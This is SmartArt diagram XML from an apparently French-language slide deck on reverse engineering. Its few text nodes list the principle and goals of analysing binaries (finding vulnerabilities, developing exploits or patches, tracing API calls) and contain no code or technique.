    <dgm:pt modelId="{03E01C27-E3E3-44B9-B315-B99C36AAB262}" type="pres">
      <dgm:prSet presAssocID="{A3A6AD8D-1EEA-42E3-89F2-CE9850E54D53}" presName="bgRect" presStyleLbl="bgShp" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{49910377-65C7-4D9F-8B84-04F431F62B3D}" type="pres">
      <dgm:prSet presAssocID="{A3A6AD8D-1EEA-42E3-89F2-CE9850E54D5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D1B0A04E-7D17-48F1-90F2-656A3B34E827}" type="pres">
      <dgm:prSet presAssocID="{A3A6AD8D-1EEA-42E3-89F2-CE9850E54D53}" presName="spaceRect" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B6780A86-CF0B-4199-A3F3-18AAD564C169}" type="pres">
      <dgm:prSet presAssocID="{A3A6AD8D-1EEA-42E3-89F2-CE9850E54D53}" presName="parTx" presStyleLbl="revTx" presStyleIdx="0" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:chPref val="0"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{6D87A272-B9A5-48FD-AEA5-37DD7DCF6FBF}" type="pres">
      <dgm:prSet presAssocID="{A3A6AD8D-1EEA-42E3-89F2-CE9850E54D53}" presName="desTx" presStyleLbl="revTx" presStyleIdx="1" presStyleCnt="4">
        <dgm:presLayoutVars/>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{D38E1E76-969D-4676-B979-AB22BAA7D303}" type="pres">
      <dgm:prSet presAssocID="{38D38471-4544-4891-8AB7-50D8C93D1F42}" presName="sibTrans" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{21E46B84-15C5-4BF3-993A-7DB2D30B9D3D}" type="pres">
      <dgm:prSet presAssocID="{C8649DE8-5AD8-48FF-A969-C8E41717BE5B}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{1AD40AF1-86FF-4BB6-9FBF-6A6EFD8CBA2E}" type="pres">
      <dgm:prSet presAssocID="{C8649DE8-5AD8-48FF-A969-C8E41717BE5B}" presName="bgRect" presStyleLbl="bgShp" presStyleIdx="1" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{F84DF0E4-8B0D-4203-A077-AEE821D8C54B}" type="pres">
      <dgm:prSet presAssocID="{C8649DE8-5AD8-48FF-A969-C8E41717BE5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t"/>
        </a:ext>
      </dgm:extLst>
    </dgm:pt>
    <dgm:pt modelId="{77A87788-A332-4341-BB6A-5E843817D4AD}" type="pres">
      <dgm:prSet presAssocID="{C8649DE8-5AD8-48FF-A969-C8E41717BE5B}" presName="spaceRect" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{410F42FC-3A28-4295-97FD-7FC5C7EBDC21}" type="pres">
      <dgm:prSet presAssocID="{C8649DE8-5AD8-48FF-A969-C8E41717BE5B}" presName="parTx" presStyleLbl="revTx" presStyleIdx="2" presStyleCnt="4">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:chPref val="0"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{5B42C973-D9C7-424E-8220-1AA60370009A}" type="pres">
      <dgm:prSet presAssocID="{C8649DE8-5AD8-48FF-A969-C8E41717BE5B}" presName="desTx" presStyleLbl="revTx" presStyleIdx="3" presStyleCnt="4">
        <dgm:presLayoutVars/>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{0407E406-9424-41C4-90F2-88FD4E9254FC}" type="presOf" srcId="{2841CA77-CC39-4022-BC60-828D7A4A3C87}" destId="{5B42C973-D9C7-424E-8220-1AA60370009A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{F4F5300B-7003-4C77-A4AE-6EA494E53D8A}" type="presOf" srcId="{5B6E02F3-006F-4B72-B199-462EA1B87F54}" destId="{6D87A272-B9A5-48FD-AEA5-37DD7DCF6FBF}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{E2DD740F-E869-492D-A3C8-E1144B3D8D0B}" type="presOf" srcId="{2AA7FE43-9694-405E-923E-F5053B42D750}" destId="{C4C50E3D-0EEA-47CB-8483-14DC7474DAE9}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{3365A219-D16D-4A94-81BA-A7FA80A96F82}" srcId="{A3A6AD8D-1EEA-42E3-89F2-CE9850E54D53}" destId="{5B6E02F3-006F-4B72-B199-462EA1B87F54}" srcOrd="0" destOrd="0" parTransId="{348EF990-49D3-4D34-AC9F-78086CFB5B61}" sibTransId="{2C4F74B1-C6C2-48CA-91ED-9252B033AC9C}"/>
    <dgm:cxn modelId="{C874F922-90F0-43A3-B891-6D2712DAB985}" srcId="{2AA7FE43-9694-405E-923E-F5053B42D750}" destId="{A3A6AD8D-1EEA-42E3-89F2-CE9850E54D53}" srcOrd="0" destOrd="0" parTransId="{C3B36F74-7AED-4AF0-879D-EA6724615319}" sibTransId="{38D38471-4544-4891-8AB7-50D8C93D1F42}"/>
    <dgm:cxn modelId="{984B9F63-33A5-4533-8FCA-FC5054D06ECB}" srcId="{C8649DE8-5AD8-48FF-A969-C8E41717BE5B}" destId="{2841CA77-CC39-4022-BC60-828D7A4A3C87}" srcOrd="0" destOrd="0" parTransId="{6FAB0FFE-8648-4A3B-97AE-41D58B9C2A55}" sibTransId="{7BD99095-B30C-4DC4-AF90-6C5F6D64C706}"/>
    <dgm:cxn modelId="{28721A79-F26E-4D12-A081-DBEB1B71CD69}" type="presOf" srcId="{A3A6AD8D-1EEA-42E3-89F2-CE9850E54D53}" destId="{B6780A86-CF0B-4199-A3F3-18AAD564C169}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{3FEE8DA5-5A1A-48C7-B6A3-925FFA4F11D2}" type="presOf" srcId="{C8649DE8-5AD8-48FF-A969-C8E41717BE5B}" destId="{410F42FC-3A28-4295-97FD-7FC5C7EBDC21}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{2D4CADB1-4692-43DA-A01C-08669DB21584}" srcId="{2AA7FE43-9694-405E-923E-F5053B42D750}" destId="{C8649DE8-5AD8-48FF-A969-C8E41717BE5B}" srcOrd="1" destOrd="0" parTransId="{69FD5FA6-E159-40B1-897B-35101971F416}" sibTransId="{E7091D64-9166-484D-A0AE-612997655E6D}"/>
    <dgm:cxn modelId="{D248E7CC-07EF-4F15-AFF1-8E70FD159213}" type="presOf" srcId="{B4919BC3-CDB9-45BC-8C75-22138DBDD055}" destId="{5B42C973-D9C7-424E-8220-1AA60370009A}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{DE0396F1-08BF-4417-BF8E-37057758C170}" srcId="{C8649DE8-5AD8-48FF-A969-C8E41717BE5B}" destId="{B4919BC3-CDB9-45BC-8C75-22138DBDD055}" srcOrd="1" destOrd="0" parTransId="{EC7956AA-1847-4229-97C8-8390BFA1B7CE}" sibTransId="{9C037578-E1AE-46DE-900B-9E41B7BA15D5}"/>
    <dgm:cxn modelId="{7BFA4344-192D-4170-9888-DCAB5116C41C}" type="presParOf" srcId="{C4C50E3D-0EEA-47CB-8483-14DC7474DAE9}" destId="{7E1A8A4F-03E6-42F8-85F8-7953E43ED184}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{889B8163-BED1-44AA-A111-F4681EF147CD}" type="presParOf" srcId="{7E1A8A4F-03E6-42F8-85F8-7953E43ED184}" destId="{03E01C27-E3E3-44B9-B315-B99C36AAB262}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{B126C8F5-D3EA-45C0-80A0-0D5CB9E3A6CA}" type="presParOf" srcId="{7E1A8A4F-03E6-42F8-85F8-7953E43ED184}" destId="{49910377-65C7-4D9F-8B84-04F431F62B3D}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{8FEB2F9F-7855-413A-A7AC-4A3853BE059C}" type="presParOf" srcId="{7E1A8A4F-03E6-42F8-85F8-7953E43ED184}" destId="{D1B0A04E-7D17-48F1-90F2-656A3B34E827}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{AFF3A714-59B6-4AA7-ADCB-E94BE9344DC3}" type="presParOf" srcId="{7E1A8A4F-03E6-42F8-85F8-7953E43ED184}" destId="{B6780A86-CF0B-4199-A3F3-18AAD564C169}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{89E1AD0E-8699-4ACE-8274-B7CEA853A523}" type="presParOf" srcId="{7E1A8A4F-03E6-42F8-85F8-7953E43ED184}" destId="{6D87A272-B9A5-48FD-AEA5-37DD7DCF6FBF}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{6DB121CF-CB2D-4EB5-9166-57FAFC9D4364}" type="presParOf" srcId="{C4C50E3D-0EEA-47CB-8483-14DC7474DAE9}" destId="{D38E1E76-969D-4676-B979-AB22BAA7D303}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{6AAAF047-7582-4865-81BA-AE4BB749AAFD}" type="presParOf" srcId="{C4C50E3D-0EEA-47CB-8483-14DC7474DAE9}" destId="{21E46B84-15C5-4BF3-993A-7DB2D30B9D3D}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{FCBD428C-7ABE-4B7D-98E6-895B54C4D78E}" type="presParOf" srcId="{21E46B84-15C5-4BF3-993A-7DB2D30B9D3D}" destId="{1AD40AF1-86FF-4BB6-9FBF-6A6EFD8CBA2E}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{98534914-0358-48C8-8B3F-BF8B6B282889}" type="presParOf" srcId="{21E46B84-15C5-4BF3-993A-7DB2D30B9D3D}" destId="{F84DF0E4-8B0D-4203-A077-AEE821D8C54B}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{70A7C1C4-2A86-4349-9006-D379DBA6062D}" type="presParOf" srcId="{21E46B84-15C5-4BF3-993A-7DB2D30B9D3D}" destId="{77A87788-A332-4341-BB6A-5E843817D4AD}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{70A7D420-5BC1-45C0-8E63-CB3D0838B235}" type="presParOf" srcId="{21E46B84-15C5-4BF3-993A-7DB2D30B9D3D}" destId="{410F42FC-3A28-4295-97FD-7FC5C7EBDC21}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconVerticalSolidList"/>
    <dgm:cxn modelId="{4CC6C9CE-9445-447D-B3A7-7C8CAACB32E7}" type="presParOf" srcId="{21E46B84-15C5-4BF3-993A-7DB2D30B9D3D}" destId="{5B42C973-D9C7-424E-8220-1AA60370009A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B30A0B76-095A-4FE4-B977-263763452425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499199-7192-4EAA-B671-D5FDAB865B27}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Principe :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5A05737D-A55E-41F6-A20D-ECE70D25C4C5}" type="parTrans" cxnId="{7C7CED5E-CE93-458B-8D08-AC7BD14C4676}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B8437BB6-EE4C-4683-8F7D-6E1C0DF964B2}" type="sibTrans" cxnId="{7C7CED5E-CE93-458B-8D08-AC7BD14C4676}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E1D0DB74-77A5-4FBA-8094-5D4A37E23152}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Analyser un binaire pour comprendre sa logique interne.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{51F6C62F-B771-419C-B795-FD63D9E4A2D7}" type="parTrans" cxnId="{4CD68D0D-6C4B-424F-9D44-733E0D5B0997}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D4362C12-FFBC-4946-8983-5BB5B3E5EFEE}" type="sibTrans" cxnId="{4CD68D0D-6C4B-424F-9D44-733E0D5B0997}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{BA610789-EEAA-4430-9C52-012C100F8017}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Objectifs :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7C773702-CA04-4585-92D2-3CDEE8A3C1C3}" type="parTrans" cxnId="{D2367924-B842-48B8-ADE6-0DD95C03710F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{39D4771C-DD10-405F-A788-30EF1B5F8F91}" type="sibTrans" cxnId="{D2367924-B842-48B8-ADE6-0DD95C03710F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{AFED45A6-A0EE-4E0D-8C9B-B08924E48123}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Identifier les vulnérabilités ou les algorithmes.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{389DFFB7-686D-4006-9F43-A2AE8F710B30}" type="parTrans" cxnId="{EC39DA74-5A48-4CD0-A0EF-45A303021C10}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{76D703FF-04C0-42C1-820A-7E5AEDD319E3}" type="sibTrans" cxnId="{EC39DA74-5A48-4CD0-A0EF-45A303021C10}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{72F60319-597F-4DB2-949C-CC16FAF2A875}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Développer des exploits ou des patchs.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5ECC65BE-6FE8-45DF-AB52-F5340741C7A7}" type="parTrans" cxnId="{549E2667-93D0-48C0-8EB3-10B01CCACE3F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D511FC84-7281-4330-9541-847307E1B002}" type="sibTrans" cxnId="{549E2667-93D0-48C0-8EB3-10B01CCACE3F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B0C35F32-8476-E649-97C3-A4A719C834F6}" type="pres">
      <dgm:prSet presAssocID="{B30A0B76-095A-4FE4-B977-263763452425}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{36818C04-E326-6546-A128-8634C64DFCFA}" type="pres">
      <dgm:prSet presAssocID="{8F499199-7192-4EAA-B671-D5FDAB865B27}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{5BF8ECC4-2663-B546-BF0E-FDDF32539E13}" type="pres">
      <dgm:prSet presAssocID="{8F499199-7192-4EAA-B671-D5FDAB865B27}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B1626687-0E39-4C41-AAF7-9F429CBD3923}" type="pres">
      <dgm:prSet presAssocID="{8F499199-7192-4EAA-B671-D5FDAB865B2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082A811-250A-CC41-9DF5-CAD9CDA24669}" type="pres">
      <dgm:prSet presAssocID="{8F499199-7192-4EAA-B671-D5FDAB865B27}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{06C7B458-017E-7B48-9C4E-F2D84DCF592E}" type="pres">
      <dgm:prSet presAssocID="{8F499199-7192-4EAA-B671-D5FDAB865B27}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="0" presStyleCnt="2">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{978057BB-DAC8-7641-84C5-5882E68ADE68}" type="pres">
      <dgm:prSet presAssocID="{B8437BB6-EE4C-4683-8F7D-6E1C0DF964B2}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{FA471CFD-AEA1-464E-B02A-94F5C201F503}" type="pres">
      <dgm:prSet presAssocID="{BA610789-EEAA-4430-9C52-012C100F8017}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E0702CD4-FD77-5B42-B34E-FC6EC29A4071}" type="pres">
      <dgm:prSet presAssocID="{BA610789-EEAA-4430-9C52-012C100F8017}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{25C8C000-D8A0-F64B-AF09-1715FB572A2B}" type="pres">
      <dgm:prSet presAssocID="{BA610789-EEAA-4430-9C52-012C100F801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7610E29-E61A-5A48-B6C8-A95C73763B59}" type="pres">
      <dgm:prSet presAssocID="{BA610789-EEAA-4430-9C52-012C100F8017}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{F6F95642-EF6D-2146-B83E-941680AE978C}" type="pres">
      <dgm:prSet presAssocID="{BA610789-EEAA-4430-9C52-012C100F801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7159D00-CBCD-A746-BC2D-81AB1FA7102A}" type="presOf" srcId="{8F499199-7192-4EAA-B671-D5FDAB865B27}" destId="{5BF8ECC4-2663-B546-BF0E-FDDF32539E13}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{4CD68D0D-6C4B-424F-9D44-733E0D5B0997}" srcId="{8F499199-7192-4EAA-B671-D5FDAB865B27}" destId="{E1D0DB74-77A5-4FBA-8094-5D4A37E23152}" srcOrd="0" destOrd="0" parTransId="{51F6C62F-B771-419C-B795-FD63D9E4A2D7}" sibTransId="{D4362C12-FFBC-4946-8983-5BB5B3E5EFEE}"/>
    <dgm:cxn modelId="{D2367924-B842-48B8-ADE6-0DD95C03710F}" srcId="{B30A0B76-095A-4FE4-B977-263763452425}" destId="{BA610789-EEAA-4430-9C52-012C100F8017}" srcOrd="1" destOrd="0" parTransId="{7C773702-CA04-4585-92D2-3CDEE8A3C1C3}" sibTransId="{39D4771C-DD10-405F-A788-30EF1B5F8F91}"/>
    <dgm:cxn modelId="{755EF024-03A7-E146-B09A-472B79C1C75B}" type="presOf" srcId="{AFED45A6-A0EE-4E0D-8C9B-B08924E48123}" destId="{F6F95642-EF6D-2146-B83E-941680AE978C}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{C606AC28-0BBC-F64A-BA01-DC02F6E83FAE}" type="presOf" srcId="{BA610789-EEAA-4430-9C52-012C100F8017}" destId="{E0702CD4-FD77-5B42-B34E-FC6EC29A4071}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{45A05144-3887-3643-80E5-075D75DA591B}" type="presOf" srcId="{72F60319-597F-4DB2-949C-CC16FAF2A875}" destId="{F6F95642-EF6D-2146-B83E-941680AE978C}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{23A5AF51-5C53-8647-9103-3C501C44D42B}" type="presOf" srcId="{BA610789-EEAA-4430-9C52-012C100F8017}" destId="{25C8C000-D8A0-F64B-AF09-1715FB572A2B}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{7C7CED5E-CE93-458B-8D08-AC7BD14C4676}" srcId="{B30A0B76-095A-4FE4-B977-263763452425}" destId="{8F499199-7192-4EAA-B671-D5FDAB865B27}" srcOrd="0" destOrd="0" parTransId="{5A05737D-A55E-41F6-A20D-ECE70D25C4C5}" sibTransId="{B8437BB6-EE4C-4683-8F7D-6E1C0DF964B2}"/>
    <dgm:cxn modelId="{549E2667-93D0-48C0-8EB3-10B01CCACE3F}" srcId="{BA610789-EEAA-4430-9C52-012C100F8017}" destId="{72F60319-597F-4DB2-949C-CC16FAF2A875}" srcOrd="1" destOrd="0" parTransId="{5ECC65BE-6FE8-45DF-AB52-F5340741C7A7}" sibTransId="{D511FC84-7281-4330-9541-847307E1B002}"/>
    <dgm:cxn modelId="{B709A768-107D-6A4B-80FD-7BD63420D22F}" type="presOf" srcId="{8F499199-7192-4EAA-B671-D5FDAB865B27}" destId="{B1626687-0E39-4C41-AAF7-9F429CBD3923}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{9EA7E36D-B264-AA45-87E4-20718C805E04}" type="presOf" srcId="{B30A0B76-095A-4FE4-B977-263763452425}" destId="{B0C35F32-8476-E649-97C3-A4A719C834F6}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{EC39DA74-5A48-4CD0-A0EF-45A303021C10}" srcId="{BA610789-EEAA-4430-9C52-012C100F8017}" destId="{AFED45A6-A0EE-4E0D-8C9B-B08924E48123}" srcOrd="0" destOrd="0" parTransId="{389DFFB7-686D-4006-9F43-A2AE8F710B30}" sibTransId="{76D703FF-04C0-42C1-820A-7E5AEDD319E3}"/>
    <dgm:cxn modelId="{C482D5F4-D3CF-5243-B2EE-52045C7D8AE3}" type="presOf" srcId="{E1D0DB74-77A5-4FBA-8094-5D4A37E23152}" destId="{06C7B458-017E-7B48-9C4E-F2D84DCF592E}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{18CB9067-CB9B-A64D-BB0F-5722A7644431}" type="presParOf" srcId="{B0C35F32-8476-E649-97C3-A4A719C834F6}" destId="{36818C04-E326-6546-A128-8634C64DFCFA}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{1E544801-06F4-7940-BEF9-45CBDB0406CC}" type="presParOf" srcId="{36818C04-E326-6546-A128-8634C64DFCFA}" destId="{5BF8ECC4-2663-B546-BF0E-FDDF32539E13}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{1AD6D138-B0DB-C945-B3CF-25FF4EE9F489}" type="presParOf" srcId="{36818C04-E326-6546-A128-8634C64DFCFA}" destId="{B1626687-0E39-4C41-AAF7-9F429CBD3923}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{F2B684F7-8B5E-6E44-B814-B4881B81945C}" type="presParOf" srcId="{B0C35F32-8476-E649-97C3-A4A719C834F6}" destId="{1082A811-250A-CC41-9DF5-CAD9CDA24669}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{DD654926-2D7F-1D45-97F3-9CCF82F9D6B9}" type="presParOf" srcId="{B0C35F32-8476-E649-97C3-A4A719C834F6}" destId="{06C7B458-017E-7B48-9C4E-F2D84DCF592E}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{79FCBC73-3679-D14A-B859-38D1F4905567}" type="presParOf" srcId="{B0C35F32-8476-E649-97C3-A4A719C834F6}" destId="{978057BB-DAC8-7641-84C5-5882E68ADE68}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{0263AB40-8689-BB4C-B530-0680823297A5}" type="presParOf" srcId="{B0C35F32-8476-E649-97C3-A4A719C834F6}" destId="{FA471CFD-AEA1-464E-B02A-94F5C201F503}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{7A2B3552-D063-964B-9719-3D1CA81BB9F3}" type="presParOf" srcId="{FA471CFD-AEA1-464E-B02A-94F5C201F503}" destId="{E0702CD4-FD77-5B42-B34E-FC6EC29A4071}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{30A293FB-AD4F-714F-A90A-9A0AB158D95E}" type="presParOf" srcId="{FA471CFD-AEA1-464E-B02A-94F5C201F503}" destId="{25C8C000-D8A0-F64B-AF09-1715FB572A2B}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{0B3CF0B7-3968-1948-B4C4-8DEC3B362234}" type="presParOf" srcId="{B0C35F32-8476-E649-97C3-A4A719C834F6}" destId="{37610E29-E61A-5A48-B6C8-A95C73763B59}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{CCAA012C-0C55-4A4D-B3B7-05854A365C90}" type="presParOf" srcId="{B0C35F32-8476-E649-97C3-A4A719C834F6}" destId="{F6F95642-EF6D-2146-B83E-941680AE978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5B29E401-8DD4-4B97-B709-6B979915F648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B7FE655-9026-4506-A258-9584F8F54CD6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Traçage des appels API.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
